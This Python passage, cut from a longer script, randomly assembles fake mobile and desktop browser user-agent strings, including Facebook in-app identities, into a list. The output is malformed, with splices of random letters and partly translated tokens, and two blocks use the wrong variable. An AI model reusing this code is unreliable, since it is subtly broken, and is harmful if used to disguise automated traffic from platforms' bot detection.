        'Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 10;'
    b = random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12'])
    c = 'RMX2185 Build/'
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = ' 4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 '
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (SMART-TV;'
    b = random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12'])
    c = 'Linux; Tizen 2.4.0)'
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 tv'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Safari/538.1'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; U; Android 10; '
    b = random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12'])
    c = 'Aquaris X2 Build/'
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = ' QKQ1.200216.002) AppleWebKit/537.36 (KHTML, like Gecko) Versi/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = '4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9 .3'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 9;'
    b = random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12'])
    c = 'Lenovo TB-X605L Build/'
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'PKQ1.190319.001 ) AppleWebKit/537.36 (KHTML, seperti Gecko) JioBrowser/1.4.7 Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = '74.0.3729.136 Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; U; Android 5.1.1; zh-cn;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'vivo Xplay5A Build/LMY47V)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/534.30 (KHTML, seperti Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Versi/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android'
    b = random.choice([
        '5.0',
        '6.0',
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'SAMSUNG SM-F900U Build/PPR1.180610.011'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Windows NT 10.0;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Win64; x64'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/108.0.0.0 Safari/537.36 Vivaldi/5.5.2805.50'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice([
        '5.0',
        '6.0',
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/56.0.2924.87'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'''{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 11;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Redmi Note 9 Pro)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/105.0.5195.19 Mobile Safari/537.36 TwitterAndroid'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android'
    b = random.choice([
        '5.0',
        '6.0',
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'en-US; vivo 1807 Build/OPM1.171019.026'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 12;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'V2149 Build/'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Version/4.0 Chrome/103.0.5060.53 Mobile Safari/537.36uc mini browser3.0'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    a = 'Mozilla/5.0 (Linux; Android 11;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Infinix X6811 Build/RP1A.200720.011; wv'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 12;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        '2201116PG'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 10;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'RMX2185 Build/QP1A.190711.020; wv)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 12;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'SHARK KTUS-H0'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 9;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        '6002 Build/PPR1.180610.011; wv'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (iPhone;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'CPU iPhone OS 16_0 like Mac OS X)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/605.1.15 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile/20A357 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/en_Qaau_GB;FBOP/5]'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 11;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Infinix X688B'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Windows NT 10.0;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Win64; x64'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Series40;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Nokia2000/11.95;'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'S40OviBrowser/2.2.0.0.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 8.1.0;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'ASUS_Z01QD'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/72.0.3626.76 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 9;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'PortalTV'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/85.0.4183.120 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 9;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'PortalTV Build/PKQ1.190408.001; wv'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 5.1;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'GT-810 Build/LMY47I'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/66.0.3359.106 Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
